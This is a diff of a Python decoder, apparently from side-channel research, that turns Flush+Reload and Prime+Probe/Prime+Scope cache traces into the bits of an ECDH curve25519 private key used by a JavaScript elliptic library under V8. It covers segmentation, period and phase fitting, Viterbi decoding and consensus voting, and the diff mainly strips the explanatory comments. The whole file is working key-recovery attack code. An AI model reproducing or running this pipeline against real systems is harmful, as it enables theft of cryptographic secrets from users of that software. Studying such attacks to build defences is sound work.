@@ -10,51 +10,17 @@ from collections import namedtuple
 import utils
 from utils import lat_to_hit
 
-# ---------------------------------------------------------------------------
-# Config / defaults
-# ---------------------------------------------------------------------------
 
 ratio_thresh = 0.60
 
 grid_lo, grid_hi = 0.55, 1.80
 merge_max = 0.50
 
-# A per-trace period estimate is accepted into the CAPTURE's estimate only if
-# the ladder it implies (nbits * T) covers this much of the trace's hit span.
-# On P+P the 2-means split in split_gap lands on the re-prime cadence rather
-# than the bit period in most traces -- measured on pp_k0_r00100, 70 of 100
-# traces returned T ~ 2.9k against a true 47.9k -- and those traces then
-# segment into 1000+ bursts and decode at chance. The two populations are three
-# orders of magnitude apart in this ratio (0.05 against 0.8), so the filter
-# needs no tuning; it exists to reject, not to choose.
 period_lo, period_hi = 0.40, 1.50
 period_probe_traces = 120
 
-# Fixed intra/inter-step gap threshold for P+P, matching v8_ctjs_ecdh.cc's
-# qual_gap_split: the two populations are ~2.6-4.3k cyc (the four BN.select
-# calls of one step) and ~36-42k cyc (the field arithmetic between steps), an
-# order of magnitude apart on either side of 10000, independently of key. The
-# per-trace bootstrap above used to re-derive this threshold PER TRACE via
-# split_gap's 2-means, which starves on a single trace's ~200-1000 samples and
-# locks onto internal sub-structure in the small-gap population instead of the
-# true split -- measured 30-54% per-trace acceptance at 100-1000 runs (the
-# period_lo/period_hi note above). Pooling every trace's raw gaps into one
-# 2-means call does not fix it either -- tried on pp_k0_r00100 and it landed
-# at ~1.7k, worse than any single trace, because the pooled small-gap
-# population has enough mass to reveal its OWN internal modes and 2-means
-# splits those instead. The known-good fixed value raises per-trace
-# acceptance to a consistent ~74% across every P+P capture tested (vs the
-# 0-74% range above), independent of key or session.
 pp_gap_split = 10000
 
-# On the uniform-grid path the ladder's start is found outright (ladder_anchor),
-# so the window search is a small correction around it rather than a scan of
-# every burst -- 17 candidates instead of ~208, which is also what stops
-# consensus from wandering off to a window hundreds of slots away. The
-# remaining OFFSET from the anchor to bit 0 is the primitive's detection lag:
-# P+P reports an access when the probe completes, measured 1 slot on
-# pp_k0_r00100. It is chosen per capture, jointly with the phase, because the
-# two trade off against each other (a whole slot is four quarter-slot phases).
 window_margin = 8
 align_offsets = 4
 align_probe_traces = 40
@@ -68,34 +34,13 @@ llr_folds = 3
 history_taps = 2
 history_ridge = 1e-2
 
-# Sub-slot phase candidates for the eviction primitives. P+S and P+P report a
-# detection LATE -- the access is seen when the probe completes, and the
-# re-prime that follows is blind -- so the bursts find_slots lands on are offset
-# from the true bit boundaries. Measured against the victim oracle on P+P: the
-# period is recovered to 0.7% but the edges sit a MEDIAN OF HALF A BIT PERIOD
-# from the truth, which makes every slot straddle two bits and costs most of the
-# contrast (per-trace 0.525 against a 0.755 oracle ceiling). F+R does not need
-# this (its response peaks at lag 0), so it stays at 1 there.
-#
-# Worth 1-2 bits on a healthy capture (P+P 131 -> 131 correct with 1 fewer
-# wrong, P+S 27 -> 29) and more when the capture is dense enough to stress
-# segmentation. 8 steps measured identical to 4, so 4 it is.
 phase_steps = {"fr": 1, "ps": 4, "pp": 4}
-phase_probe_traces = 120   # traces pooled to choose it; more does not move it
-# Seed alignment by score bimodality instead of burst span. Measured WORSE on
-# P+P (0.724 -> 0.558 known-acc) and on a degraded F+R capture, better on P+S;
-# off by default, since span is what the rest of the pipeline was tuned with.
+phase_probe_traces = 120
 seed_by_contrast = False
 
-# P+S matched decoder (vote_matched). Its response is smeared over ~4 slots and
-# peaks at lag 1, so it needs a longer kernel than the F+R contamination model
-# and a posterior -- not an LLR -- to decide which bits are resolved.
 ps_posterior = 0.99
 ps_fit_rounds = 8
 
-# vote_counts: P+P's per-slot marker count is discrete and its likelihood is
-# what carries the signal, so counts above this are pooled into one bin (they
-# are rare and all mean the same thing) and the PMFs are fitted by EM.
 count_cap = 12
 count_em_rounds = 60
 count_prior = 0.5
@@ -103,25 +48,10 @@ mode_halfwidth = 0.05
 llr_first_pass = 2.5
 
 
-# ---------------------------------------------------------------------------
-# Capture loading
-# ---------------------------------------------------------------------------
-
 BuiltinLine = namedtuple("BuiltinLine", "handler off role")
 
 
 def load_builtin_lines(directory):
-    """Read the metadata the attacker writes next to the traces: one
-    `<col> <role> <handler> <off> <primitive>` row per monitored line.
-
-    Returns (list of BuiltinLine in column order, primitive). Field names and
-    order match v8_ctjs_ecdh.cc's `struct builtin_line`, which produced it.
-    The file is still called `channels` on disk -- 168 existing captures carry
-    that name, several with 3, 4 or 6 columns and the previous leak site's
-    offsets. Hard error if missing: guessing a layout silently swaps the marker
-    and clock columns, which decodes to confident nonsense rather than to an
-    error.
-    """
     path = os.path.join(directory, "channels")
     if not os.path.exists(path):
         raise SystemExit(f"no `channels` metadata in {directory} -- the "
@@ -137,16 +67,7 @@ def load_builtin_lines(directory):
 
 
 def load_trace(filepath, primitive):
-    """One r<i>.out -> per-column arrays of hit timestamps.
-
-    Parsing and the hit test both come from evaluation/utils.py, so a latency
-    classifies here exactly as it does in the other experiments. A row is the
-    i-th sample of each column, not a moment in time, so the columns are
-    independent time series. F+R re-checks the latency (a capture taken with a
-    looser -thresh can still be tightened offline); P+S only ever records
-    samples already past its eviction threshold, so every one counts.
-    """
-    attack = "FR" if primitive == "fr" else "PS"   # ps and pp both pre-thresholded
+    attack = "FR" if primitive == "fr" else "PS"
     df = utils.load_trace(filepath)
     cols = []
     for i in range(df.shape[1]):
@@ -156,15 +77,7 @@ def load_trace(filepath, primitive):
     return cols
 
 
-# ---------------------------------------------------------------------------
-# Burst segmentation
-# ---------------------------------------------------------------------------
-
 def split_gap(gaps):
-    """Threshold separating intra-burst gaps (one poll period) from inter-burst
-    ones (one bit period), by 2-means on log10(gap). Both clusters span an order
-    of magnitude or more and the split is deep, so this needs no tuning across
-    poll rates or primitives."""
     lg = np.log10(np.maximum(gaps, 1))
     lo, hi = lg.min(), lg.max()
     if hi - lo < 0.3:
@@ -183,22 +96,6 @@ def split_gap(gaps):
 
 
 def fit_uniform_grid(starts, T):
-    """Burst starts -> a uniform ruler (a + b*i) fitted through them, and b.
-
-    Once the period is known the burst starts are 246 noisy observations of one
-    two-parameter line, so fitting beats using them directly: a burst's first
-    hit is late by however long the victim took to touch the line and by the
-    probe that caught it, and taking that jitter as a slot EDGE hands the error
-    to the neighbouring slot as well. Measured on pp_k0_r00100 against the
-    victim's own boundaries: raw starts 0.667 per-trace accuracy, this 0.761,
-    with the detection ceiling at 0.777.
-
-    Each burst is indexed by the rounded number of periods since its
-    predecessor, so a slot the attacker never sampled leaves a hole in the
-    index rather than shifting everything after it -- the same reason
-    find_slots counts from the predecessor. The fit is then trimmed twice at
-    3 MAD, which is what keeps a stalled iteration from tilting the ruler.
-    """
     idx = np.concatenate(([0.0], np.cumsum(
         np.maximum(np.rint(np.diff(starts) / T), 1.0))))
     a, b = np.polyfit(idx, starts, 1)[::-1]
@@ -215,25 +112,6 @@ def fit_uniform_grid(starts, T):
 
 
 def ladder_anchor(pooled, starts, T, nbits, tol=1):
-    """Index of the slot where the ladder's activity BEGINS, on a uniform grid.
-
-    The ladder is a run of consecutively occupied slots, and what makes it
-    findable is the silence in front of it: measured on pp_k0_r00100 against
-    the victim's own boundaries, the six slots before the first ladder bit hold
-    0.00 hits per trace, the first ladder slot holds a partial 1.93 clock hits
-    against an interior mean of 4.12, and activity stops 2-3 slots after the
-    last bit.
-
-    So this takes the START of the longest occupied run, not the densest
-    nbits-window: occupancy SATURATES across the ladder, every window inside it
-    ties, and argmax then returns the earliest tie -- measured one slot early
-    in 89 of 93 traces, which is a whole-key shift. `tol` empty slots are
-    allowed inside a run, since a slot the attacker happened not to sample
-    should not split the ladder in two.
-
-    The remaining offset from here to bit 0 is the primitive's detection lag,
-    which is a property of the capture rather than of the trace; EC_KEY
-    .pick_alignment chooses it once, the same way the phase is chosen once."""
     pos = np.floor((pooled - starts[0]) / T).astype(np.int64)
     pos = pos[(pos >= 0) & (pos < len(starts))]
     occ = np.zeros(len(starts), dtype=bool)
@@ -261,19 +139,6 @@ def ladder_anchor(pooled, starts, T, nbits, tol=1):
 
 
 def count_mixture_ll(K, cap=None, rounds=None):
-    """Total log-likelihood of a 2-component mixture fitted to per-slot counts.
-
-    Used to choose the capture's alignment, not to decode: a grid whose slots
-    line up with the victim's bits produces two clean count populations, and
-    one that straddles produces their blur, so the fit is measurably better at
-    the right offset. Measured over 16 (offset, phase) pairs on pp_k0_r00100,
-    it picks 0.7331 per-trace accuracy against a 0.7414 best -- while the
-    bimodality score candidate_contrast uses ranks the CATASTROPHIC offset
-    (whole-key shift, 0.5217) second, 4.653 against 4.739. The likelihood
-    separates the same pair by 543 nats.
-
-    The EM is the memoryless one from vote_counts, without its component
-    ordering: only the fit quality is wanted here, not which side is a 0."""
     cap = count_cap if cap is None else cap
     rounds = count_em_rounds if rounds is None else rounds
     K = np.clip(np.rint(np.atleast_2d(K)).astype(int), 0, cap)
@@ -297,15 +162,6 @@ def count_mixture_ll(K, cap=None, rounds=None):
 
 
 def capture_period(files, primitive, nbits, sample=None):
-    """The ladder's bit period for a WHOLE capture, or None.
-
-    T is the victim's, not the trace's: every run of one capture executes the
-    same ladder, and the measured spread is 46.4k-49.3k around a 47.9k truth.
-    So it is worth estimating once from many traces and imposing on all of
-    them, rather than re-derived per trace where a single bad split ruins that
-    trace. Estimates that fail the period_lo/period_hi span test are dropped
-    first -- see the note there; on P+P, before pp_gap_split, most were.
-    """
     thresh = pp_gap_split if primitive == "pp" else None
     est = []
     for fp in files[:sample or len(files)]:
@@ -326,40 +182,6 @@ def capture_period(files, primitive, nbits, sample=None):
 
 
 def find_slots(all_hits, nbits=None, T_hint=None, thresh=None):
-    """All channels' hits (pooled) -> per-bit slot EDGES for the ladder.
-
-    `thresh` overrides split_gap's per-call intra/inter-step threshold with a
-    caller-supplied one -- see pp_gap_split, capture_period's only caller of
-    this so far.
-
-    grid_lo/grid_hi bound the steps taken to be exactly one ladder iteration
-    (they set T's estimate); merge_max is the step below which two bursts are
-    structure WITHIN one iteration rather than two iterations. Both are in
-    units of the bit period.
-
-    1. cut the hit stream into bursts on the gap threshold above;
-    2. give each burst a slot index, counted from its PREDECESSOR rather than
-       from the start of the capture -- a 1% error in the bit period would
-       otherwise drift by whole slots over 250 iterations. Two bursts less than
-       half a period apart are one split burst and share an index; a step of
-       ~kT means k-1 bits went unsampled and leaves that many empty indices;
-    3. pick the ladder as the densest window of `nbits` consecutive slots.
-       Cutting on gap size instead does not work: derive()'s pre-ladder bursts
-       are 12-40 periods before the ladder, but the ladder itself occasionally
-       stalls for ~8 periods (scheduling), so there is no threshold that
-       separates the two. Density is unambiguous -- the ladder is 250 occupied
-       slots in a row and everything else is a handful;
-    4. take each slot's edge from its own burst, interpolating across empty
-       slots, so a stall or a slow iteration shifts nothing after it. (This is
-       what the old decoder's uniform ruler got wrong.)
-
-    With `T_hint` (a capture-level period, see capture_period) steps 1 and 2
-    are replaced outright: bursts are cut at merge_max * T_hint and the edges
-    come from fit_uniform_grid rather than from the bursts themselves. That is
-    the path P+P takes, and it is what makes its windows countable -- 7 or so
-    instead of the 800 a collapsed per-trace period produces.
-
-    Returns (edges of length nslots+1, T) or (None, None)."""
     if len(all_hits) < 16:
         return None, None
     gaps = np.diff(all_hits)
@@ -370,12 +192,6 @@ def find_slots(all_hits, nbits=None, T_hint=None, thresh=None):
         if len(starts) < 8:
             return None, None
         grid, T = fit_uniform_grid(starts, float(T_hint))
-        # One burst per bit is what the BURST path needs, because there a slot
-        # with no hits is a slot with no edge. A fitted grid interpolates
-        # across those, so the test here is whether the ruler REACHES nbits
-        # slots, not whether the attacker sampled every one of them. Measured
-        # on pp_k0_r01000: requiring a burst per bit threw away 111 traces that
-        # decode fine, 634 kept against 745.
         if grid is None or (nbits and len(grid) < nbits):
             return None, None
         return grid, T
@@ -408,36 +224,14 @@ def find_slots(all_hits, nbits=None, T_hint=None, thresh=None):
     return starts, T
 
 
-# ---------------------------------------------------------------------------
-# Per-trace decode
-# ---------------------------------------------------------------------------
-
 def decode_candidates(cols, builtin_lines, nbits, tag=None, phases=1,
                       phase=None, phase_contrast=None, T_hint=None, offset=0):
-    """One derive()'s hits -> one candidate decode per possible ladder window,
-    and (for the eviction primitives) per sub-slot phase shift of the whole
-    grid; see `phase_steps` for why the phase matters.
-
-    Returns (list of MSB-first strings over {'0','1','u'}, offset of the
-    tightest-span window within that list). The caller picks between them by
-    consensus with the other traces; see align_candidates."""
     marker = [i for i, r in enumerate(builtin_lines)
               if r.role in "01" and i < len(cols)]
     clock = [i for i, r in enumerate(builtin_lines)
              if r.role == "c" and i < len(cols)]
     if not marker:
         return [], [], [], 0
-    # A run can come back with no hits at all in ANY column -- rare on a healthy
-    # capture, routine on a degraded one. Treat it like a trace that cannot be
-    # segmented (drop it, keep decoding the rest); np.concatenate([]) instead
-    # raises and kills the whole capture's decode.
-    # Segmenting on the CLOCK ALONE is tempting -- pooling every column makes
-    # the burst structure bit-DEPENDENT, since a 0-bit slot contributes the
-    # marker's hits as well as the clock's -- and it does lift P+P's per-trace
-    # accuracy, 0.672 to 0.723. It was tried on 2026-08-07 and reverted: far
-    # fewer traces segment at all (P+P 841 -> 512) so the vote nets out level,
-    # and F+R falls apart, `alt` going from 0 wrong to 56 and `free3` from 0 to
-    # 8. The clock alone is too sparse to carry the segmentation there.
     nonempty = [c for c in cols if len(c)]
     if not nonempty:
         if tag:
@@ -453,14 +247,6 @@ def decode_candidates(cols, builtin_lines, nbits, tag=None, phases=1,
     nwin = len(starts) - nbits + 1
     spans = starts[nbits - 1:] - starts[:nwin]
     if T_hint:
-        # A fitted uniform grid gives every window the SAME span, so a
-        # tightest-span seed degenerates to argmin = window 0 -- the earliest,
-        # which is derive()'s pre-ladder activity, tens to hundreds of slots
-        # before the ladder. Measured: the correct window was the LAST one in
-        # every trace checked, 0.74-0.85 where window 0 scored 0.37, and
-        # consensus then locked the whole capture onto it (known-acc 0.48).
-        # Consensus cannot rescue that: every trace is wrong the same way, so
-        # they agree with each other. The seed has to be right on its own.
         seed = min(max(ladder_anchor(pooled, starts, T, nbits) + offset, 0),
                    nwin - 1)
         lo0 = max(0, seed - window_margin)
@@ -473,17 +259,6 @@ def decode_candidates(cols, builtin_lines, nbits, tag=None, phases=1,
     def grid(lo, ph):
         return np.append(starts[lo:lo + nbits], starts[lo + nbits - 1] + T) - ph
 
-    # Phase and window offset are SEPARABLE -- the phase shifts every slot
-    # boundary by the same sub-slot amount, the offset slides the window by
-    # whole slots -- so they are chosen one after the other, not jointly.
-    # Scanning the product is what made this unusable: 8 phases x ~250 windows
-    # x 1000 traces did not finish. Here it costs `phases` extra decodes.
-    # `phase` is a FRACTION of the bit period, because T varies slightly from
-    # trace to trace. It is chosen once per CAPTURE (EC_KEY.pick_phase), not
-    # here: the shift is the primitive's detection lag, a property of the
-    # machine and the poll loop, so every trace shares it. Choosing it per
-    # trace measured WORSE than not shifting at all (P+P 0.775 -> 0.568) --
-    # one trace's 246 slots are too little to estimate it from.
     if phase_contrast is not None:
         for k in range(phases):
             phase_contrast.append(candidate_contrast(
@@ -505,30 +280,9 @@ def decode_candidates(cols, builtin_lines, nbits, tag=None, phases=1,
 
 
 def decode_window(cols, marker, clock, builtin_lines, edges):
-    """Score one ladder window. Returns (labels, score, raw marker counts).
-
-    Per slot, marker hits / clock hits: ~1.0 for a 0-bit, ~0.37 for a 1-bit
-    (F+R, random scalar). The RAW counts come back too because for P+P they
-    are the whole signal and averaging them away loses it -- see vote_counts.
-
-    Returns (per-trace labels, voting score). The score is the marker COUNT
-    scaled by this trace's MEDIAN clock count, so captures at different poll
-    rates share one threshold. Do NOT normalise per slot by that slot's own
-    clock count: it injects the clock's variance into a quantity whose 0-bit
-    value is otherwise very tight (3.63 +- 0.09 of the 4 BN.select calls), and
-    that tightness is the whole separation from contaminated 1-bits. Measured,
-    per-slot leaves 5-12 bits wrong where the count leaves 0-4.
-
-    A capture with no role 'c' line falls back to a constant 4.0 normaliser and
-    decodes badly (14-22 wrong): the clock is required. Roles come from the
-    capture's own `channels` file -- BitwiseAndHandler+0x000 runs 12x per
-    BN.select and must never carry role 'c'."""
     n = len(edges) - 1
 
     def counts(idxs):
-        """Per-slot hit count, AVERAGED over the channels in this role: the two
-        clock lines each fire once per BN.select, so summing them would double
-        the ratio's denominator."""
         total = np.zeros(n, dtype=float)
         for i in idxs:
             pos = np.searchsorted(edges, cols[i], side="right") - 1
@@ -552,16 +306,6 @@ def decode_window(cols, marker, clock, builtin_lines, edges):
 
 
 def candidate_contrast(score):
-    """How two-population a candidate window's per-slot scores look, as a
-    standardised gap between the two clusters a 2-means split finds.
-
-    This is the seed for align_candidates, and it is what makes a sub-slot
-    PHASE choosable. A window at the wrong phase straddles two bits in every
-    slot, so 0-bits and 1-bits blur into one mode and the gap collapses; at the
-    right phase they separate. It uses no knowledge of the key and no
-    comparison with other traces -- which is exactly what the tightest-span
-    seed it replaces could not do, since span measures how COMPACT a window is
-    and a half-period-shifted window is just as compact as the right one."""
     s = score[np.isfinite(score)]
     if len(s) < 8:
         return -np.inf
@@ -583,7 +327,6 @@ def candidate_contrast(score):
 
 
 def count_emissions(K, bits, cap, prior):
-    """P(k | this bit, PREVIOUS bit) as four PMFs, from a hard bit assignment."""
     e = np.full((2, 2, cap + 1), prior)
     n = K.shape[1]
     for b in (0, 1):
@@ -595,11 +338,6 @@ def count_emissions(K, bits, cap, prior):
 
 
 def viterbi_counts(L, posteriors=False):
-    """Best bit sequence under log-emissions L[slot, bit, prev bit].
-
-    Transitions are uniform: ladder bits are an ECDH scalar, so nothing about
-    bit i predicts bit i+1. All the structure is in the emission's dependence
-    on the previous bit."""
     n = L.shape[0]
     lp = np.full((n, 2), -np.inf)
     bp = np.zeros((n, 2), dtype=int)
@@ -637,8 +375,6 @@ def viterbi_counts(L, posteriors=False):
 
 
 def majority(keys):
-    """Per-position majority label over a set of decodes, for use as an
-    alignment reference (the real answer comes from EC_KEY.vote)."""
     n = min(len(k) for k in keys)
     out = []
     for i in range(n):
@@ -648,18 +384,7 @@ def majority(keys):
     return "".join(out)
 
 
-# ---------------------------------------------------------------------------
-# History contamination model
-# ---------------------------------------------------------------------------
-
 def zero_cluster(f, halfwidth=None):
-    """Locate the 0-bit population: (centre, sd), or (None, None).
-
-    It is the densest `halfwidth` window of the averaged score. That works
-    without knowing the key because the two populations have wildly different
-    concentrations -- 0-bits sit within ~0.02 of their mean, 1-bits are spread
-    over ~0.3 -- so even a scalar that is mostly 1-bits cannot produce a denser
-    window than its 0-bits do."""
     halfwidth = mode_halfwidth if halfwidth is None else halfwidth
     g = f[np.isfinite(f)]
     if len(g) < 8:
@@ -671,26 +396,6 @@ def zero_cluster(f, halfwidth=None):
 
 
 def fit_history_fir(z, f, K=None, ridge=None):
-    """Fit E[score | 1-bit] = w0 + sum_{k=1..K} w_k * z[i-k] by ridge least
-    squares on the currently-labelled 1-bits. Returns (w, residual sd).
-
-    An FIR rather than a decaying state, because the contamination is not
-    monotone in recency: measured against the -bits oracle, a 1-bit's mean
-    marker count by its two predecessors is 00 -> 2.54, 01 -> 1.70, 10 -> 1.55,
-    11 -> 0.64. A decay must put 10 above 01; the measurement puts 01 higher.
-    Fitted weights are nearly flat (~0.27, 0.27, 0.16), not a decay.
-
-    The ridge term is load-bearing. On a periodic scalar the lagged regressors
-    go collinear with the label being fitted, the unpenalised solution is
-    arbitrary along that null direction, and the relabelling iteration follows
-    it to a confidently INVERTED decode (alt at -wait=1000: 3.8% correct on 79
-    'known' bits). Do not raise K past 4 -- the intercept goes negative.
-
-    history_taps MUST be >= 1. K=0 (the removed single-pole model) scored best
-    on random scalars and inverted an all-ones scalar outright, 230 of 231 known
-    bits wrong: a constant scalar has no 0-cluster to anchor on. Always include
-    ones/zeros when sweeping K. K is also coupled to the attacker's poll rate --
-    K=3 at -wait=200, K=2 at -wait=2000 -- so re-derive it if -wait changes."""
     K = history_taps if K is None else K
     ridge = history_ridge if ridge is None else ridge
     n = len(z)
@@ -709,10 +414,6 @@ def fit_history_fir(z, f, K=None, ridge=None):
 
 
 def fit_matched_kernel(z, f, taps, ridge=None):
-    """Least squares for f[i] = c + sum_{k=0..taps-1} h[k]*z[i-k].
-
-    Ridged for the same reason fit_history_fir is: on a periodic scalar the
-    lagged regressors go collinear and an unpenalised fit runs away."""
     ridge = history_ridge if ridge is None else ridge
     n = len(f)
     X = np.ones((n, taps + 1))
@@ -727,8 +428,6 @@ def fit_matched_kernel(z, f, taps, ridge=None):
 
 
 def ps_noise_sd(f, c, h, z=None):
-    """Residual sd of the matched model, floored so a lucky fit cannot make the
-    Viterbi emissions arbitrarily confident."""
     if z is None:
         return max(float(np.std(f)) * 0.5, 1e-3)
     resid = f - (c + history_convolve(z, h))
@@ -736,7 +435,6 @@ def ps_noise_sd(f, c, h, z=None):
 
 
 def history_convolve(z, h):
-    """sum_k h[k]*z[i-k], zero-padded at the start."""
     out = np.zeros(len(z))
     for k, hk in enumerate(h):
         if k:
@@ -747,22 +445,14 @@ def history_convolve(z, h):
 
 
 def viterbi_matched(f, c, h, sd, posteriors=False):
-    """MAP bit sequence under f[i] = c + sum_k h[k]*z[i-k], plus per-bit
-    posteriors when asked.
-
-    The state is the previous taps-1 z values, so choosing z[i] fixes the
-    predicted level exactly. Both passes share one emission table; the
-    forward-backward posterior is what decides resolved-vs-unknown, because the
-    Viterbi path alone is as confident on a smeared bit as on a clean one."""
     n = len(f)
     taps = len(h)
     mem = taps - 1
     nstates = 1 << mem if mem > 0 else 1
 
-    # emit[i, s, b] = log N(f[i] | c + h.z), state s holding z[i-1..i-mem]
     lvl = np.zeros((nstates, 2))
     for s in range(nstates):
-        past = [(s >> k) & 1 for k in range(mem)]   # past[0] = z[i-1]
+        past = [(s >> k) & 1 for k in range(mem)]
         base = c + sum(h[k + 1] * past[k] for k in range(mem))
         lvl[s, 0] = base
         lvl[s, 1] = base + h[0]
@@ -787,7 +477,6 @@ def viterbi_matched(f, c, h, sd, posteriors=False):
                     if cand > delta[i, t]:
                         delta[i, t] = cand
                         back[i, t] = s * 2 + b
-    # last step's emission
     final = np.full(nstates, neg)
     last_choice = np.zeros(nstates, dtype=np.int64)
     for s in range(nstates):
@@ -810,7 +499,6 @@ def viterbi_matched(f, c, h, sd, posteriors=False):
     if not posteriors:
         return z, None
 
-    # forward-backward on the same emissions, in log space
     def lse(a, axis=None):
         m = np.max(a, axis=axis, keepdims=True)
         m = np.where(np.isfinite(m), m, 0.0)
@@ -849,7 +537,6 @@ def viterbi_matched(f, c, h, sd, posteriors=False):
 
 
 def history_predict_fir(z, w):
-    """The fitted 1-bit mean at every position."""
     K = len(w) - 1
     n = len(z)
     X = np.stack([np.ones(n)] +
@@ -858,20 +545,11 @@ def history_predict_fir(z, w):
 
 
 def history_llr_fir(f, z, a, sd_a, w, sd_1):
-    """Same two-Gaussian log-likelihood ratio as history_llr, FIR 1-bit mean."""
     p1 = history_predict_fir(z, w)
     return ((-0.5 * ((f - a) / sd_a) ** 2 - np.log(sd_a)) -
             (-0.5 * ((f - p1) / sd_1) ** 2 - np.log(sd_1)))
 
 
-# ---------------------------------------------------------------------------
-# Scalar + voting
-# ---------------------------------------------------------------------------
-
-# curve25519 group order. `KeyPair.prototype._importPrivate` reduces every
-# private scalar by it (`this.priv = this.priv.umod(this.ec.curve.n)`), so a key
-# file holding a value >= n names a DIFFERENT scalar than the ladder actually
-# consumes -- see EC_KEY.__init__.
 CURVE25519_N = 2 ** 252 + 27742317777372353535851937790883648493
 
 
@@ -881,25 +559,13 @@ class EC_KEY:
         if not key_str.startswith("0x"):
             key_str = "0x" + key_str
         self.secret_key = int(key_str, 16)
-        # Score against what the victim MULTIPLIES BY, not what the file says.
-        # elliptic reduces the scalar mod the curve order on import, silently.
-        # 25 of the 128 pool keys are uniform 32-byte draws that exceed n, and
-        # scoring those against the raw value reads as a broken attack (15-134
-        # "wrong" bits, or a 256-bit expectation the 253-slot ladder cannot even
-        # segment) when the decode is in fact correct. No-op for every scalar
-        # already below n, including the crafted zeros/ones/alt probes.
         self.secret_key %= CURVE25519_N
         self.secret_key_bin = bin(self.secret_key)[2:]
         self.secret_key_bits = len(self.secret_key_bin)
         self.builtin_lines = builtin_lines
         self.primitive = primitive
         self.phase = 0.0
-        # One bit period for the whole capture, set by infer_directory. None
-        # in single-file mode (-f), where there is nothing to pool over and
-        # find_slots falls back to its per-trace estimate.
         self.period = None
-        # Whole-slot lag from the ladder's first active slot to bit 0, chosen
-        # with the phase by pick_alignment. Only meaningful with self.period.
         self.offset = 0
         self.infer_keys = []
         self.candidates = []
@@ -909,17 +575,12 @@ class EC_KEY:
 
     @classmethod
     def load(cls, path, builtin_lines, primitive):
-        """Read the scalar the capture was taken with, in either key format the
-        attacker accepts: a pool entry (ec_key_<i>.json, {key1, key2} -- key1 is
-        the scalar derive() consumes and the attack recovers) or a raw-hex file
-        (ec_key_<name>.hex, the crafted patterns)."""
         raw = open(path).read().strip()
         if raw.startswith("{"):
             raw = json.loads(raw)["key1"].strip()
         return cls(raw, builtin_lines, primitive)
 
     def infer_file(self, filename, debug=False, phase_contrast=None):
-        """Decode one trace into one candidate per possible ladder window."""
         name = os.path.basename(filename)
         cols = load_trace(filename, self.primitive)
         cands, ratios, counts, tightest = decode_candidates(
@@ -930,14 +591,6 @@ class EC_KEY:
             self.candidates.append((name, cands, ratios, counts, tightest))
 
     def pick_phase(self, files, verbose=False):
-        """One sub-slot phase for the whole capture, as a fraction of the bit
-        period: the shift whose slot grid makes the per-slot scores most
-        two-population, summed over traces.
-
-        Pooling is the point. The eviction primitives report a detection late,
-        so their slot edges sit off the true bit boundaries -- measured on P+P,
-        by a median of HALF a bit period, which makes every slot straddle two
-        bits. One trace cannot resolve that shift; a capture can."""
         steps = phase_steps.get(self.primitive, 1)
         if steps <= 1:
             return
@@ -959,21 +612,6 @@ class EC_KEY:
                       f"(from {seen} traces)")
 
     def pick_alignment(self, files, verbose=False):
-        """Choose the capture's whole-slot OFFSET and sub-slot phase together,
-        by which pair makes the per-slot counts fit a two-component mixture
-        best (count_mixture_ll).
-
-        This replaces pick_phase on the uniform-grid path, and it has to: the
-        offset and the phase are the same quantity measured in different units,
-        the anchor pins the grid only to the first ACTIVE slot, and the gap
-        from there to bit 0 is the primitive's detection lag. Getting it wrong
-        by one shifts the whole key, which no amount of voting detects -- every
-        trace is shifted the same way, so they agree with each other and the
-        decode comes back confident and wrong.
-
-        Measured over the 16 pairs on pp_k0_r00100: this picks offset 1 /
-        phase 0.5, worth 0.7331 per-trace accuracy where the best available
-        pair is 0.7414 and the worst -- a whole-key shift -- is 0.5217."""
         steps = phase_steps.get(self.primitive, 1)
         best = None
         for off in range(align_offsets):
@@ -1003,15 +641,6 @@ class EC_KEY:
         files = sorted(glob.glob(os.path.join(output_dir, "*.out")))
         if not files:
             raise ValueError(f"no .out traces in {output_dir}")
-        # Period first: the phase is a FRACTION of it, and both the alignment
-        # probe and every per-trace decode below segment against it.
-        #
-        # Eviction primitives only. F+R's per-trace segmentation is not broken
-        # -- its response peaks at lag 0, its bursts are the bits, and it
-        # decodes fr_k0_r01000 to 0 wrong bits as it stands -- so it keeps the
-        # path it was tuned with. The uniform grid exists because P+P's
-        # split_gap lands on the re-prime cadence in most traces; see
-        # period_lo.
         if self.primitive in ("pp", "ps"):
             self.period = capture_period(files, self.primitive,
                                          self.secret_key_bits,
@@ -1026,18 +655,6 @@ class EC_KEY:
             self.infer_file(fp, debug)
 
     def align_candidates(self, rounds=3, verbose=False):
-        """Choose each trace's ladder window by consensus with the others.
-
-        A capture's traces all decode the SAME scalar, so the right window is
-        the one that agrees with what the other traces say. Re-picking against
-        the majority twice fixes the ~1-in-3 traces whose window is off by one
-        burst (measured: those decode at 0.56-0.59 against 0.86 when aligned,
-        and no per-trace test distinguishes them -- only the other traces do).
-
-        The SEED is each trace's most bimodal candidate (candidate_contrast),
-        not its tightest-span one. Span cannot see phase, and P+P's edges land a
-        median of half a bit period off the truth, so a tightest-span seed hands
-        consensus a window that straddles two bits in every slot."""
         if not self.candidates:
             return
         chosen = []
@@ -1051,7 +668,7 @@ class EC_KEY:
         for _ in range(rounds):
             ref = majority([c[chosen[i]]
                             for i, (_, c, _, _, _) in enumerate(self.candidates)])
-            new = [int(np.argmax([self._agreement(k, ref) for k in c]))
+            new = [int(np.argmax([self.agreement(k, ref) for k in c]))
                    for _, c, _, _, _ in self.candidates]
             if new == chosen:
                 break
@@ -1072,7 +689,7 @@ class EC_KEY:
 
 
     @staticmethod
-    def _agreement(a, b):
+    def agreement(a, b):
         co = ag = 0
         for x, y in zip(a, b):
             if x in "01" and y in "01":
@@ -1081,50 +698,17 @@ class EC_KEY:
         return ag / co if co else 0.0
 
     def all_traces(self):
-        """Indices of the traces to vote with: all of them.
-
-        There used to be a pairwise-agreement outlier cut here, dropping traces
-        that agreed with the others less than `median - agree_margin`. It was
-        ablated across 7 captures and a 4..1000 trace sweep on 2026-08-06 and
-        removed: it never improved a decode anywhere, was bit-for-bit identical
-        to keeping everything at every trace count from 4 to 200, and actively
-        cost coverage where it did fire -- `alt` 190 known against 242, and one
-        degraded capture 0.832 known-acc against 0.870.
-
-        The reason it cannot work is visible on P+S, where the same statistic
-        is computable against ground truth: per-trace consensus agreement
-        correlates r = -0.031 with a trace's true accuracy. It does not measure
-        trace quality, so thresholding it just removes traces at random. What
-        the good traces have in common is picked up by align_candidates (which
-        does earn its place: at 4 traces 0.814 known-acc against 0.624) and by
-        the fold fail-safe (at 20 traces, 0 wrong against 19)."""
         return list(range(len(self.infer_keys)))
 
-    def _mean_score(self, kept):
-        """Per position, the scaled marker count averaged over traces.
-
-        This, and not the fraction of traces that *labelled* the position a
